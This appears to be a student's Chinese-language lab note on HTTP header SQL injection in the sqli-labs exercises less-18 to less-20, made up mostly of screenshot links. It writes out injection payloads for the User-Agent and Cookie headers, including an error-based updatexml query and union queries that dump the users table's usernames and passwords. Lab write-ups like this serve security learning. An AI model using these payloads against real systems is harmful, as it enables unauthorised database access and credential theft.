### HTTP 注入



![57c9db5d9ac7ec3201d904e4e8ba0e9c](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\57c9db5d9ac7ec3201d904e4e8ba0e9c.jpg)



#### 一. HTTP头 uagent 注入

介绍：以 less-18 为例

![Screenshot_20260120_164553_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260120_164553_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

![Screenshot_20260120_164804_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260120_164804_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

![Screenshot_20260120_165024_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260120_165024_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

详情见这里：

![image-20260120213514010](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260120213514010.png)

可以看到代码中没有对uagent进行安全校验，所以我们试着使用uagent注入

我们用命令测试一下：

INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (1,2,3);

![image-20260120213858193](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260120213858193.png)

我们使用报错注入：

INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (1 or updatexml(1,concat('````',(select database())),3),2,3);

![image-20260120214744985](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260120214744985.png)



回到注入点：

我们尝试用bp抓包，不知道为什么 127.0.0.1 不行，要用 ipv4 的地址

构造命令：User-Agent: ‘ or updatexml(1,concat('`',(select database())),3),2,3) #

![image-20260120224715843](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260120224715843.png)

我们就可以看到结果：

![image-20260120224837567](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260120224837567.png)

接下来补充代码：

![016f2457fd98ada140b32d6564eca093](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\016f2457fd98ada140b32d6564eca093.jpg)





#### 二. HTTP头 referer 

分析less-19的源代码

![40b65b078872aa022486475db65d6d9b](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\40b65b078872aa022486475db65d6d9b.jpg)

已知代码中没有对referer进行安全校验，所以我们可以使用referer注入

![fc650ef7b55a3f3d36676aab03fae328](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\fc650ef7b55a3f3d36676aab03fae328.jpg)

![Screenshot_20260120_230018_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20260120_230018_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

我们先实验一下:

![1c5d52bc9b164607a4f5efbf3705af19](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\1c5d52bc9b164607a4f5efbf3705af19.jpg)

![f2988285930a5db531e8dfbe192e58d1](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\f2988285930a5db531e8dfbe192e58d1.jpg)

![90a1588fd6ee5de9ab033de5c61bcd0b](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\90a1588fd6ee5de9ab033de5c61bcd0b.jpg)







### 三. HTTP 头 Cookie 注入

![d624486ee7107ce6a0cecc09d31b73a0](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\d624486ee7107ce6a0cecc09d31b73a0.jpg)

![24440606f43361c5f2943b4e64b1ccff](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\24440606f43361c5f2943b4e64b1ccff.jpg)

![e0767ad47705949d961f4a206d1c341f](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\e0767ad47705949d961f4a206d1c341f.jpg)



我们用 less-20 举例子

![image-20260121231133581](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260121231133581.png)

所以我们可以看到 uname=admin 中的 admin 是一个注入点



![image-20260121231718421](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260121231718421.png)

所以我们构造命令

Cookie: uname= ' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users') #

![image-20260121232540510](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260121232540510.png)

再构造

Cookie: uname= ' union select 1,2,(select group_concat(username,'--',password) from users) #

![image-20260121232817150](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20260121232817150.png)

![bf2ac86139076c0a8610766df0ec16f7](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\bf2ac86139076c0a8610766df0ec16f7.jpg)

![04b055d35fc79fb62af44025a330569f](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2026-01\9e20f478899dc29eb19741386f9343c8\04b055d35fc79fb62af44025a330569f.jpg)